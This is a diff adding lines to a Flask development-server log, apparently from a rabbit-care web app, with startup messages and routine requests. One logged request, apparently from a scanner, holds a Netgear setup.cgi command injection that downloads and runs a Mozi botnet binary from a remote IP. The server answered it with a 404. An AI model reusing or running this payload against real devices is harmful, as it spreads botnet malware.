@@ -73632,3 +73632,32 @@ Run time of job "send_daily_summary (trigger: cron[hour='8', minute='0'], next r
 127.0.0.1 - - [12/May/2026 19:58:48] "GET / HTTP/1.0" 200 -
 127.0.0.1 - - [12/May/2026 19:58:52] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
 127.0.0.1 - - [12/May/2026 19:59:18] "[33mGET /wiki HTTP/1.0[0m" 404 -
+127.0.0.1 - - [12/May/2026 20:49:14] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [12/May/2026 20:51:37] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.72.1.194:45838/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [12/May/2026 20:57:54] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [12/May/2026 20:57:55] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [12/May/2026 21:10:26] "[33mGET /hudson HTTP/1.0[0m" 404 -
+[scheduler] 每日摘要排程已啟動（08:00）
+兔子照護系統啟動：http://localhost:5200
+ * Serving Flask app 'app'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5200
+ * Running on http://192.168.68.123:5200
+[33mPress CTRL+C to quit[0m
+127.0.0.1 - - [12/May/2026 22:01:36] "[33mGET /api/health HTTP/1.1[0m" 404 -
+127.0.0.1 - - [12/May/2026 22:01:39] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [12/May/2026 22:09:36] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [12/May/2026 22:09:49] "GET /login HTTP/1.0" 200 -
+127.0.0.1 - - [12/May/2026 22:12:36] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [12/May/2026 23:36:02] "GET /login HTTP/1.0" 200 -
+127.0.0.1 - - [13/May/2026 00:12:54] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [13/May/2026 00:53:44] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [13/May/2026 00:53:45] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [13/May/2026 00:53:45] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [13/May/2026 00:57:04] "[33mGET /json/ HTTP/1.0[0m" 404 -
+127.0.0.1 - - [13/May/2026 01:03:48] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [13/May/2026 01:16:48] "GET /login HTTP/1.0" 200 -
+127.0.0.1 - - [13/May/2026 01:20:21] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [13/May/2026 01:20:22] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
